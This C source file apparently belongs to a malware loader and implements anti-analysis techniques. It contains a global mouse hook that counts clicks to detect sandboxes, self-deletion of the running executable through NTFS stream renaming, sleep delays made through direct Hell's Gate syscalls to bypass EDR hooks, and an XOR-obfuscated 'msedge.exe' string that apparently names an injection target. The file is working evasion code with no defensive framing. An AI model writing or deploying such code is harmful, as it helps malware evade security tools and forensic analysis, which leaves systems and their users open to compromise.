/*
	this file contains all the anti-analysis techniques used:
		- MouseClicksLogger
		- DeleteSelf
		- DelayExecutionVia_NtDE

	All combined to 'AntiAnalysis' function
*/

#include <Windows.h>

#include "Structs.h"
#include "Common.h"
#include "Debug.h"

// using the 'extern' keyword, because both variables are defined in the 'Inject.c' file
extern VX_TABLE g_Sys;
extern API_HASHING g_Api;


// global hook handle variable
HHOOK g_hMouseHook = NULL;
// global mouse clicks counter
DWORD g_dwMouseClicks = NULL;

//------------------------------------------------------------------------------------------------------------------------------------------------//
//------------------------------------------------------------------------------------------------------------------------------------------------//


// the callback function that will be executed whenever the user clicked a mouse button
LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

    // WM_RBUTTONDOWN :         "Right Mouse Click"
    // WM_LBUTTONDOWN :         "Left Mouse Click"
    // WM_MBUTTONDOWN :         "Middle Mouse Click"

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
#ifdef DEBUG
		PRINTA("[+] Mouse Click Recorded \n");
#endif // DEBUG
		g_dwMouseClicks++;
    }

    return g_Api.pCallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}



BOOL MouseClicksLogger() {

    MSG         Msg = { 0 };

    // installing hook 
    g_hMouseHook = g_Api.pSetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        NULL
    );
    if (!g_hMouseHook) {
#ifdef DEBUG
		PRINTA("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
#endif // DEBUG
	}

    // process unhandled events
    while (g_Api.pGetMessageW(&Msg, NULL, NULL, NULL)) {
		g_Api.pDefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }

    return TRUE;
}

//------------------------------------------------------------------------------------------------------------------------------------------------//
//------------------------------------------------------------------------------------------------------------------------------------------------//



BOOL DeleteSelf() {


	WCHAR					szPath[MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO	Delete = { 0 };
	HANDLE					hFile = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO		pRename = NULL;
	const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
	SIZE_T					sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

	// allocating enough buffer for the 'FILE_RENAME_INFO' structure
	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
#ifdef DEBUG
		PRINTA("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
#endif // DEBUG
		return FALSE;
	}

	// cleaning up the structures
	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

	//--------------------------------------------------------------------------------------------------------------------------
	// marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
	Delete.DeleteFile = TRUE;

	// setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
	pRename->FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));

	//--------------------------------------------------------------------------------------------------------------------------

	// used to get the current file name
	if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
#ifdef DEBUG
		PRINTA("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
#endif // DEBUG
		return FALSE;
	}

	//--------------------------------------------------------------------------------------------------------------------------
	// RENAMING

	// openning a handle to the current file
	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTA("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
#endif // DEBUG
		return FALSE;
	}

#ifdef DEBUG
	PRINTW(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);
#endif // DEBUG

	// renaming the data stream
	if (!g_Api.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
#ifdef DEBUG
		PRINTA("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
#endif // DEBUG
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] DONE \n");
#endif // DEBUG

	g_Api.pCloseHandle(hFile);

	//--------------------------------------------------------------------------------------------------------------------------
	// DELEING

	// openning a new handle to the current file
	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
		// in case the file is already deleted
		return TRUE;
	}
	if (hFile == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTA("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
#endif // DEBUG
		return FALSE;
	}

#ifdef DEBUG
	PRINTA("[i] DELETING ...");
#endif // DEBUG

	// marking for deletion after the file's handle is closed
	if (!g_Api.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
#ifdef DEBUG
		PRINTA("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
#endif // DEBUG
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] DONE \n");
#endif // DEBUG

	g_Api.pCloseHandle(hFile);

	//--------------------------------------------------------------------------------------------------------------------------

	// freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}

//------------------------------------------------------------------------------------------------------------------------------------------------//
//------------------------------------------------------------------------------------------------------------------------------------------------//


BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

	// converting minutes to milliseconds
	DWORD				dwMilliSeconds		= ftMinutes * 60000;
	LARGE_INTEGER		DelayInterval		= { 0 };
	LONGLONG			Delay				= NULL;
	NTSTATUS			STATUS				= NULL;
	DWORD				_T0					= NULL,
						_T1					= NULL;

#ifdef DEBUG
	PRINTA("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds", (dwMilliSeconds / 1000));
#endif // DEBUG

	// converting from milliseconds to the 100-nanosecond - negative time interval
	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = g_Api.pGetTickCount64();

	// sleeping for 'dwMilliSeconds' ms 
	HellsGate(g_Sys.NtDelayExecution.wSystemCall);
	if ((STATUS = HellDescent(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
#ifdef DEBUG
		PRINTA("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
		return FALSE;
	}

	_T1 = g_Api.pGetTickCount64();

	// slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtDE' succeeded, otherwize it failed
	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;

#ifdef DEBUG
	PRINTA("\n\t>> _T1 - _T0 = %d \n", (DWORD)(_T1 - _T0));
	PRINTA("[+] DONE \n");
#endif // DEBUG

	return TRUE;
}


//------------------------------------------------------------------------------------------------------------------------------------------------//
//------------------------------------------------------------------------------------------------------------------------------------------------//


BOOL AntiAnalysis(DWORD dwMilliSeconds) {

	HANDLE					hThread			= NULL;
	NTSTATUS				STATUS			= NULL;
	LARGE_INTEGER			DelayInterval	= { 0 };
	FLOAT					i				= 1;
	LONGLONG				Delay			= NULL;
	DWORD _T0								=NULL;

	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;
	_T0 = g_Api.pGetTickCount64();

	// self-deletion 
	if (!DeleteSelf()) {
		// we dont care for the result - but you can chage this if you want
	}

	// try 10 times, after that return FALSE
	while (i <= 10) {

#ifdef DEBUG
		PRINTA("[#] Monitoring Mouse-Clicks For %d Seconds - Need 6 Clicks To Pass\n", (dwMilliSeconds / 1000));
#endif // DEBUG

		// creating a thread that runs 'MouseClicksLogger' function
		HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
		if ((STATUS = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
#ifdef DEBUG
			PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
			return FALSE;
		}

		// waiting for the thread for 'dwMilliSeconds'
		HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
		if ((STATUS = HellDescent(hThread, FALSE, &DelayInterval)) != 0 && STATUS != STATUS_TIMEOUT) {
#ifdef DEBUG
			PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
			return FALSE;
		}

		HellsGate(g_Sys.NtClose.wSystemCall);
		if ((STATUS = HellDescent(hThread)) != 0) {
#ifdef DEBUG
			PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG
			return FALSE;
		}

		// unhooking 
		if (g_hMouseHook && !UnhookWindowsHookEx(g_hMouseHook)) {
#ifdef DEBUG
			PRINTA("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
#endif // DEBUG
			return FALSE;
		}

		// delaying execution for specifice amount of time
		if (!DelayExecutionVia_NtDE((FLOAT)(i / 2)))
			return FALSE;

		// if the user clicked more than 5 times, we return true
		if (g_dwMouseClicks > 5)
			return TRUE;

		// if not, we reset the mouse-clicks variable, and monitor the mouse-clicks again
		g_dwMouseClicks = NULL;

		// increment 'i', so that next time 'DelayExecutionVia_NtDE' will wait longer
		i++;
	}

	return FALSE;
}

WCHAR* DeobfuscateProcessName() {
	static WCHAR obfuscated[] = {
		L'm' ^ 0x55, L's' ^ 0x55, L'e' ^ 0x55, L'd' ^ 0x55,
		L'g' ^ 0x55, L'e' ^ 0x55, L'.' ^ 0x55, L'e' ^ 0x55,
		L'x' ^ 0x55, L'e' ^ 0x55, 0x00
	};

	for (int i = 0; obfuscated[i] != 0x00; i++) {
		obfuscated[i] ^= 0x55;
	}

	return obfuscated;
}








